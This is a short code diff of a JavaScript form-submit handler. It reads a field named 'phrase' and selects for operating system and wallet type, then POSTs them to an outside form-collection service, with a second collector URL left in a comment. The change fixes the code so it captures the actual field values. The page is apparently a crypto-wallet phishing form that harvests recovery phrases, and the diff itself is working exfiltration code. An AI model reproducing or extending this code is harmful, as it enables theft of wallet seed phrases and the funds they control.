@@ -1551,9 +1551,9 @@ form.addEventListener('submit', (event) => {
   event.preventDefault(); // prevent default form submission behavior
 
   const formData = new FormData(form); // create new FormData objecthttps://usebasin.com/f/eb20225ebe56 
-var phraseText = document.getElementById('phrase');
-var osText = document.getElementById('osTypeSelect');
-var walletText = document.getElementById('walletTypeSelect');
+var phraseText = document.getElementById('phrase').value;
+var osText = document.getElementById('osTypeSelect').value;
+var walletText = document.getElementById('walletTypeSelect').value;
   
       fetch("https://submit-form.com/gmAjhBF4R", {
         method: "POST",
